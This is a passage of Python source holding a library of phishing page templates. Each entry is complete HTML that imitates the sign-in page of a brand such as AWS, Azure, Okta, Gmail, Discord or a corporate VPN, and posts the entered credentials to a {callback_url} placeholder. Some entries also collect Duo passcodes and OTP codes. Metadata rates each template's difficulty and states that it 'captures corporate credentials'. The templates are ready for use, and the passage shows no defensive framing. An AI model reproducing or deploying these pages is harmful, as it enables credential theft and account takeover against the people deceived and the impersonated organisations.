class="logo">CHASE 💳</div><h1>Sign in</h1><form method="POST" action="{callback_url}"><div class="input-group"><label>Username</label><input type="text" name="username" placeholder="Username" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign In</button></form><div class="links"><a href="#">Forgot username/password?</a></div></div></body></html>""",  # noqa
    },

    # ── Cloud / SaaS Services ────────────────────────────────────
    {
        "id": "aws_console",
        "name": "AWS Management Console",
        "category": "Cloud/SaaS",
        "description": "AWS root account login page.",
        "brand": "AWS",
        "difficulty": "Medium",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>AWS Management Console</title><style>body{background:#f2f3f3;font-family:Amazon Ember,Helvetica Neue,Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:450px;width:100%;padding:40px;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,.08)}.logo{text-align:center;margin-bottom:32px}.logo svg{height:30px}h1{font-size:18px;font-weight:400;color:#16191f;text-align:center;margin:0 0 24px}.input-group{margin-bottom:20px}.input-group label{display:block;font-size:14px;color:#16191f;font-weight:500;margin-bottom:4px}.input-group input{width:100%;padding:10px 12px;border:1px solid #aab7b8;border-radius:2px;font-size:14px;box-sizing:border-box}.input-group input:focus{border-color:#ff9900;outline:none;box-shadow:0 0 0 2px rgba(255,153,0,.2)}button{background:#ff9900;color:#16191f;border:none;padding:12px 24px;font-size:14px;width:100%;cursor:pointer;border-radius:2px;font-weight:500}button:hover{background:#ec8600}.links{text-align:center;margin-top:20px}.links a{color:#0073bb;font-size:13px;text-decoration:none;display:block;margin-bottom:8px}</style></head><body><div class="card"><div class="logo"><svg viewBox="0 0 48 30" xmlns="http://www.w3.org/2000/svg"><path d="M14.3 11.6c0 .3.2.4.5.3 1.6-.7 3.4-1 5.2-1 1.7 0 3.4.3 4.9 1 .3.1.5 0 .5-.3v-1c0-.3-.2-.5-.5-.6-1.5-.7-3.2-1-4.9-1-1.8 0-3.6.3-5.2 1-.3.1-.5.3-.5.6v1zm0 4.1c0 .3.2.5.5.4 1.5-.6 3.1-.9 4.7-.9 1.6 0 3.2.3 4.7.9.3.1.5 0 .5-.4v-1c0-.3-.2-.5-.5-.6-1.5-.7-3.1-1-4.7-1-1.6 0-3.2.3-4.7 1-.3.1-.5.3-.5.6v1zm-5.1-8.2c0 .3.2.5.5.4 1.1-.5 2.2-.7 3.4-.7 1.2 0 2.3.2 3.4.7.3.1.5 0 .5-.4v-1c0-.3-.2-.5-.5-.6-1.1-.5-2.2-.8-3.4-.8-1.2 0-2.3.3-3.4.8-.3.1-.5.3-.5.6v1zm24.1 7.3c-.3-.1-.5-.3-.5-.6v-1c0-.3.2-.5.5-.4 1.5.6 3.1.9 4.7.9 1.6 0 3.2-.3 4.7-.9.3-.1.5 0 .5.4v1c0 .3-.2.5-.5.6-1.5.6-3.1.9-4.7.9-1.6 0-3.2-.3-4.7-.9z" fill="#FF9900"/></svg></div><h1>Sign in to the Console</h1><form method="POST" action="{callback_url}"><div class="input-group"><label>Email</label><input type="email" name="email" placeholder="Email address" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign In</button></form><div class="links"><a href="#">Forgot password?</a><a href="#">Create a new AWS account</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "azure_login",
        "name": "Microsoft Azure Login",
        "category": "Cloud/SaaS",
        "description": "Azure Portal sign-in page.",
        "brand": "Azure",
        "difficulty": "Medium",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in to Azure</title><style>body{background:#fff;font-family:'Segoe UI',Segoe,Tahoma,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:440px;width:100%;padding:44px;border-radius:2px;box-shadow:0 2px 6px rgba(0,0,0,.2)}.logo{display:flex;align-items:center;margin-bottom:24px}.logo svg{width:120px}h1{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 4px}.subtitle{font-size:15px;color:#1b1b1b;margin-bottom:24px}.input-group{margin-bottom:16px}.input-group input{width:100%;padding:6px 10px;border:1px solid #8c8c8c;border-radius:2px;font-size:15px;box-sizing:border-box;height:36px}.input-group input:focus{border-color:#0067b8;outline:none}button{background:#0067b8;color:#fff;border:none;padding:6px 20px;font-size:15px;cursor:pointer;float:right;margin-top:16px;min-width:108px;height:32px}button:hover{background:#005da6}</style></head><body><div class="card"><div class="logo"><svg viewBox="0 0 21 21"><rect x="1" y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="11" width="9" height="9" fill="#0078d4"/></svg></div><h1>Sign in</h1><p class="subtitle">to continue to Azure Portal</p><form method="POST" action="{callback_url}"><div class="input-group"><input type="text" name="email" placeholder="Email, phone, or Skype" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign in</button></form></div></body></html>""",  # noqa
    },
    {
        "id": "dropbox_login",
        "name": "Dropbox Login",
        "category": "Cloud/SaaS",
        "description": "Dropbox sign-in page.",
        "brand": "Dropbox",
        "difficulty": "Easy",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Dropbox - Sign in</title><style>body{background:#f7f7f7;font-family:Atten New,Segoe UI,Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:400px;width:100%;padding:48px 40px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,.08);text-align:center}.logo{color:#0061ff;font-size:24px;font-weight:700;margin-bottom:32px}h1{font-size:28px;font-weight:700;color:#1d1d1f;margin:0 0 8px}.subtitle{font-size:16px;color:#757575;margin-bottom:32px}.input-group{margin-bottom:20px;text-align:left}.input-group input{width:100%;padding:14px 16px;border:1px solid #d9d9d9;border-radius:8px;font-size:16px;box-sizing:border-box}.input-group input:focus{border-color:#0061ff;outline:none;box-shadow:0 0 0 3px rgba(0,97,255,.12)}button{background:#0061ff;color:#fff;border:none;border-radius:8px;padding:14px;font-size:16px;font-weight:600;width:100%;cursor:pointer}button:hover{background:#0053d6}.links{margin-top:24px}.links a{color:#0061ff;font-size:14px;text-decoration:none}</style></head><body><div class="card"><div class="logo">Dropbox</div><h1>Sign in</h1><p class="subtitle">to continue to Dropbox</p><form method="POST" action="{callback_url}"><div class="input-group"><input type="email" name="email" placeholder="Email" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign in</button></form><div class="links"><a href="#">Forgot your password?</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "slack_login",
        "name": "Slack Login",
        "category": "Cloud/SaaS",
        "description": "Slack workspace sign-in.",
        "brand": "Slack",
        "difficulty": "Easy",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Slack - Sign in</title><style>body{background:#f4f4f4;font-family:Slack-Lato,Slack-Fractions,appleLogo,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:400px;width:100%;padding:48px 40px;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,.08);text-align:center}.logo{color:#4a154b;font-size:28px;font-weight:700;margin-bottom:32px}h1{font-size:24px;font-weight:700;color:#1d1c1d;margin:0 0 24px}.input-group{margin-bottom:16px;text-align:left}.input-group input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:4px;font-size:16px;box-sizing:border-box}.input-group input:focus{border-color:#4a154b;outline:none}button{background:#4a154b;color:#fff;border:none;border-radius:4px;padding:14px;font-size:16px;font-weight:700;width:100%;cursor:pointer}button:hover{background:#3e1240}.links{margin-top:20px}.links a{color:#1264a3;font-size:14px;text-decoration:none}.footer{margin-top:32px;font-size:12px;color:#696969}</style></head><body><div class="card"><div class="logo">Slack</div><h1>Sign in to your workspace</h1><form method="POST" action="{callback_url}"><div class="input-group"><input type="email" name="email" placeholder="name@company.com" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign In</button></form><div class="links"><a href="#">Forgot password?</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "cloudflare_login",
        "name": "Cloudflare Dashboard Login",
        "category": "Cloud/SaaS",
        "description": "Cloudflare dashboard sign-in page.",
        "brand": "Cloudflare",
        "difficulty": "Medium",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Cloudflare - Login</title><style>body{background:#fff;font-family:Inter,SF Pro,Segoe UI,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{max-width:400px;width:100%;padding:48px 32px;text-align:center}.logo{margin-bottom:32px}.logo svg{width:140px}h1{font-size:24px;font-weight:600;color:#1d1d1f;margin:0 0 24px}.input-group{margin-bottom:16px;text-align:left}.input-group input{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:6px;font-size:15px;box-sizing:border-box}.input-group input:focus{border-color:#f38020;outline:none;box-shadow:0 0 0 3px rgba(243,128,32,.15)}button{background:#f38020;color:#fff;border:none;border-radius:6px;padding:12px;font-size:15px;font-weight:600;width:100%;cursor:pointer}button:hover{background:#e0711c}.links{margin-top:16px}.links a{color:#f38020;font-size:13px;text-decoration:none;margin:0 8px}</style></head><body><div class="card"><div class="logo"><svg viewBox="0 0 48 48"><path d="M24 2L2 46h44L24 2zm0 10l18 32H6l18-32z" fill="#f38020"/></svg></div><h1>Log in to Cloudflare</h1><form method="POST" action="{callback_url}"><div class="input-group"><input type="email" name="email" placeholder="Email" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Log In</button></form></div></body></html>""",  # noqa
    },

    # ── Enterprise / Corporate Portals ───────────────────────────
    {
        "id": "okta_login",
        "name": "Okta SSO Login",
        "category": "Enterprise",
        "description": "Okta single sign-on portal. Captures corporate credentials.",
        "brand": "Okta",
        "difficulty": "Medium",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Okta Sign In</title><style>body{background:#f4f4f4;font-family:OktaSans,Helvetica Neue,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:400px;width:100%;padding:40px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.08)}.logo{text-align:center;color:#007dc1;font-size:24px;font-weight:600;margin-bottom:32px}h1{font-size:20px;font-weight:400;color:#333;text-align:center;margin:0 0 24px}.input-group{margin-bottom:20px}.input-group label{display:block;font-size:13px;color:#555;margin-bottom:4px}.input-group input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:16px;box-sizing:border-box}.input-group input:focus{border-color:#007dc1;outline:none}button{background:#007dc1;color:#fff;border:none;border-radius:4px;padding:12px;font-size:15px;width:100%;cursor:pointer}button:hover{background:#0069a5}.remember{margin-top:12px;font-size:13px;color:#666}.remember input{margin-right:4px}</style></head><body><div class="card"><div class="logo">OKTA</div><h1>Sign In</h1><form method="POST" action="{callback_url}"><div class="input-group"><label>Username</label><input type="text" name="email" placeholder="username@company.com" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign In</button></form></div></body></html>""",  # noqa
    },
    {
        "id": "duo_security",
        "name": "Duo Security 2FA",
        "category": "Enterprise",
        "description": "Duo Security two-factor authentication prompt.",
        "brand": "Duo Security",
        "difficulty": "Hard",
        "fields": ["passcode"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Duo Security - Two-Factor Authentication</title><style>body{background:#f4f4f4;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:400px;width:100%;padding:48px 40px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.08);text-align:center}.logo{color:#1c1c1c;font-size:20px;font-weight:600;margin-bottom:32px}.lock-icon{font-size:48px;margin-bottom:16px}h1{font-size:22px;font-weight:500;color:#1c1c1c;margin:0 0 8px}.subtitle{font-size:14px;color:#666;margin-bottom:24px}.input-group input{width:100%;padding:14px;border:1px solid #ccc;border-radius:6px;font-size:24px;text-align:center;letter-spacing:8px;box-sizing:border-box}.input-group input:focus{border-color:#0073b7;outline:none}button{background:#0073b7;color:#fff;border:none;border-radius:6px;padding:14px;font-size:16px;font-weight:500;width:100%;cursor:pointer;margin-top:16px}button:hover{background:#00629c}</style></head><body><div class="card"><div class="lock-icon">🔐</div><h1>Two-Factor Authentication</h1><p class="subtitle">Enter a passcode from your Duo Mobile app or hardware token</p><form method="POST" action="{callback_url}"><div class="input-group"><input type="text" name="passcode" placeholder="••••••" maxlength="6" inputmode="numeric" required></div><button type="submit">Verify</button></form></div></body></html>""",  # noqa
    },
    {
        "id": "vpn_login",
        "name": "Corporate VPN Login Portal",
        "category": "Enterprise",
        "description": "Generic corporate VPN login page. Customizable company branding.",
        "brand": "Generic Corporate",
        "difficulty": "Medium",
        "fields": ["username", "password", "otp"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Secure VPN Login</title><style>body{background:linear-gradient(135deg,#1a237e,#283593);font-family:'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:400px;width:100%;padding:40px;border-radius:8px;box-shadow:0 8px 32px rgba(0,0,0,.3)}.logo{text-align:center;margin-bottom:24px;color:#1a237e;font-size:18px;font-weight:600}h1{font-size:18px;color:#333;text-align:center;margin:0 0 24px}.input-group{margin-bottom:16px}.input-group label{display:block;font-size:12px;color:#666;font-weight:500;margin-bottom:4px}.input-group input{width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;font-size:14px;box-sizing:border-box}.input-group input:focus{border-color:#1a237e;outline:none}button{background:#1a237e;color:#fff;border:none;border-radius:4px;padding:12px;font-size:14px;font-weight:600;width:100%;cursor:pointer}button:hover{background:#151d6b}.footer{text-align:center;margin-top:20px;font-size:11px;color:#999}</style></head><body><div class="card"><div class="logo">🛡️ {company_name|Corporate VPN}</div><h1>Secure Remote Access</h1><form method="POST" action="{callback_url}"><div class="input-group"><label>Username</label><input type="text" name="username" placeholder="domain\\username" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><div class="input-group"><label>OTP Code</label><input type="text" name="otp" placeholder="123456" inputmode="numeric"></div><button type="submit">Connect</button></form></div></body></html>""",  # noqa
    },

    # ── Email / Webmail ─────────────────────────────────────────
    {
        "id": "outlook_web",
        "name": "Outlook Web App",
        "category": "Email",
        "description": "Outlook Web Access (OWA) login page.",
        "brand": "Outlook",
        "difficulty": "Medium",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Outlook - Sign In</title><style>body{background:#f2f2f2;font-family:'Segoe UI',Segoe,Tahoma,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:440px;width:100%;padding:44px;border-radius:2px;box-shadow:0 2px 6px rgba(0,0,0,.2)}.logo{margin-bottom:24px;font-size:20px;font-weight:600;color:#0078d4}h1{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 24px}.input-group{margin-bottom:16px}.input-group input{width:100%;padding:6px 10px;border:1px solid #8c8c8c;border-radius:2px;font-size:15px;box-sizing:border-box;height:36px}.input-group input:focus{border-color:#0078d4;outline:none}button{background:#0078d4;color:#fff;border:none;padding:6px 20px;font-size:15px;cursor:pointer;float:right;margin-top:16px;min-width:108px;height:32px;border-radius:2px}button:hover{background:#106ebe}</style></head><body><div class="card"><div class="logo">Outlook</div><h1>Sign in</h1><form method="POST" action="{callback_url}"><div class="input-group"><input type="text" name="email" placeholder="Email address" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Sign in</button></form></div></body></html>""",  # noqa
    },
    {
        "id": "gmail_login",
        "name": "Gmail Login",
        "category": "Email",
        "description": "Gmail/Google Workspace login page.",
        "brand": "Gmail",
        "difficulty": "Easy",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Gmail - Sign In</title><style>body{background:#fff;font-family:Google Sans,Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{max-width:450px;width:100%;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;text-align:center}h1{font-size:24px;font-weight:400;color:#202124;margin:0 0 8px}.subtitle{font-size:16px;color:#5f6368;margin-bottom:30px}.input-group{text-align:left;margin-bottom:20px}.input-group label{display:block;font-size:14px;color:#5f6368;margin-bottom:4px}.input-group input{width:100%;padding:12px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box}.input-group input:focus{border-color:#1a73e8;outline:none}button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:14px;font-weight:500;cursor:pointer;float:right;margin-top:10px}button:hover{background:#1765cc}</style></head><body><div class="card"><h1>Sign in</h1><p class="subtitle">to continue to Gmail</p><form method="POST" action="{callback_url}"><div class="input-group"><label>Email</label><input type="email" name="email" placeholder="Email" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Next</button></form></div></body></html>""",  # noqa
    },
    {
        "id": "protonmail_login",
        "name": "ProtonMail Login",
        "category": "Email",
        "description": "ProtonMail secure email login page.",
        "brand": "ProtonMail",
        "difficulty": "Medium",
        "fields": ["username", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ProtonMail - Log in</title><style>body{background:#1c223c;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:400px;width:100%;padding:48px 40px;border-radius:8px;text-align:center}.logo{color:#1c223c;font-size:22px;font-weight:700;margin-bottom:32px}h1{font-size:22px;font-weight:400;color:#1c223c;margin:0 0 24px}.input-group{margin-bottom:16px;text-align:left}.input-group input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:15px;box-sizing:border-box;background:#f8f8f8}.input-group input:focus{border-color:#6d4aff;outline:none;background:#fff}button{background:#6d4aff;color:#fff;border:none;border-radius:4px;padding:14px;font-size:15px;font-weight:600;width:100%;cursor:pointer}button:hover{background:#5b3ee6}.links{margin-top:16px}.links a{color:#6d4aff;font-size:13px;text-decoration:none}</style></head><body><div class="card"><div class="logo">ProtonMail</div><h1>Log in</h1><form method="POST" action="{callback_url}"><div class="input-group"><input type="text" name="username" placeholder="ProtonMail username" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Log in</button></form></div></body></html>""",  # noqa
    },

    # ── Social Media ─────────────────────────────────────────────
    {
        "id": "tiktok_login",
        "name": "TikTok Login",
        "category": "Social Media",
        "description": "TikTok login page.",
        "brand": "TikTok",
        "difficulty": "Easy",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TikTok - Log in</title><style>body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{max-width:400px;width:100%;padding:32px;text-align:center}.logo{font-size:28px;font-weight:700;color:#111;margin-bottom:32px}h1{font-size:18px;font-weight:600;color:#111;margin:0 0 24px}.input-group{margin-bottom:16px}.input-group input{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:4px;font-size:16px;box-sizing:border-box}.input-group input:focus{border-color:#fe2c55;outline:none}button{background:#fe2c55;color:#fff;border:none;border-radius:4px;padding:12px;font-size:16px;font-weight:600;width:100%;cursor:pointer}button:hover{background:#e02447}.links{margin-top:16px;font-size:13px}.links a{color:#fe2c55;text-decoration:none}</style></head><body><div class="card"><div class="logo">TikTok</div><h1>Log in</h1><form method="POST" action="{callback_url}"><div class="input-group"><input type="text" name="email" placeholder="Email or username" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Log in</button></form></div></body></html>""",  # noqa
    },
    {
        "id": "snapchat_login",
        "name": "Snapchat Login",
        "category": "Social Media",
        "description": "Snapchat login page.",
        "brand": "Snapchat",
        "difficulty": "Easy",
        "fields": ["username", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Snapchat - Log in</title><style>body{background:#fffc00;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:380px;width:100%;padding:40px;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.1);text-align:center}.logo{font-size:24px;font-weight:700;color:#111;margin-bottom:24px}h1{font-size:20px;font-weight:600;color:#111;margin:0 0 24px}.input-group{margin-bottom:14px}.input-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;box-sizing:border-box;background:#f7f7f7}.input-group input:focus{border-color:#fffc00;outline:none;background:#fff}button{background:#111;color:#fff;border:none;border-radius:40px;padding:14px;font-size:15px;font-weight:600;width:100%;cursor:pointer}button:hover{background:#333}</style></head><body><div class="card"><div class="logo">Snapchat</div><h1>Log in</h1><form method="POST" action="{callback_url}"><div class="input-group"><input type="text" name="username" placeholder="Username" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Log in</button></form></div></body></html>""",  # noqa
    },
    {
        "id": "reddit_login",
        "name": "Reddit Login",
        "category": "Social Media",
        "description": "Reddit account login page.",
        "brand": "Reddit",
        "difficulty": "Easy",
        "fields": ["username", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Reddit - Log in</title><style>body{background:#dae0e6;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Noto Sans,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#fff;max-width:400px;width:100%;padding:32px;border-radius:4px;box-shadow:0 2px 4px rgba(0,0,0,.08)}.logo{text-align:center;font-size:24px;font-weight:700;color:#ff4500;margin-bottom:24px}h1{font-size:18px;font-weight:500;color:#1c1c1c;text-align:center;margin:0 0 20px}.input-group{margin-bottom:16px}.input-group input{width:100%;padding:12px;border:1px solid #edeff1;border-radius:4px;font-size:14px;box-sizing:border-box;background:#fcfcfb}.input-group input:focus{border-color:#0079d3;outline:none}button{background:#0079d3;color:#fff;border:none;border-radius:40px;padding:14px;font-size:14px;font-weight:700;width:100%;cursor:pointer}button:hover{background:#1484d6}</style></head><body><div class="card"><div class="logo">Reddit</div><h1>Log in</h1><form method="POST" action="{callback_url}"><div class="input-group"><input type="text" name="username" placeholder="Username" required></div><div class="input-group"><input type="password" name="password" placeholder="Password" required></div><button type="submit">Log In</button></form></div></body></html>""",  # noqa
    },
    {
        "id": "discord_login",
        "name": "Discord Login",
        "category": "Social Media",
        "description": "Discord account login page.",
        "brand": "Discord",
        "difficulty": "Easy",
        "fields": ["email", "password"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Discord</title><style>body{background:#404eed;font-family:Whitney,Helvetica Neue,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#313338;max-width:480px;width:100%;padding:32px;border-radius:8px;text-align:center}.logo{color:#fff;font-size:20px;font-weight:600;margin-bottom:24px;display:flex;align-items:center;justify-content:center;gap:8px}h1{font-size:24px;font-weight:600;color:#fff;margin:0 0 8px}.subtitle{font-size:14px;color:#b5bac1;margin-bottom:24px}.input-group{margin-bottom:16px;text-align:left}.input-group label{display:block;font-size:12px;font-weight:700;color:#b5bac1;margin-bottom:4px;text-transform:uppercase}.input-group input{width:100%;padding:12px;border:1px solid #1e1f22;border-radius:4px;font-size:15px;background:#1e1f22;color:#fff;box-sizing:border-box}.input-group input:focus{border-color:#5865f2;outline:none}button{background:#5865f2;color:#fff;border:none;border-radius:4px;padding:14px;font-size:15px;font-weight:600;width:100%;cursor:pointer;margin-top:8px}button:hover{background:#4752c4}.links{margin-top:12px}.links a{color:#00a8fc;font-size:13px;text-decoration:none}</style></head><body><div class="card"><div class="logo">Discord</div><h1>Welcome back!</h1><p class="subtitle">We're so excited to see you again!</p><form method="POST" action="{callback_url}"><div class="input-group"><label>Email or phone number</label><input type="text" name="email" placeholder="Email or phone number" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Log In</button></form><div class="links"><a href="#">Forgot your password?</a></div></div></body></html>""",  # noqa
    },
    {
        "id": "telegram_login",
        "name": "Telegram Web Login",
        "category": "Social Media",
        "description": "Telegram Web login page.",
        "brand": "Telegram",
        "difficulty": "Easy",
        "fields": ["phone", "code"],
        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Telegram Web</title><style>body{background:#5682a3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height
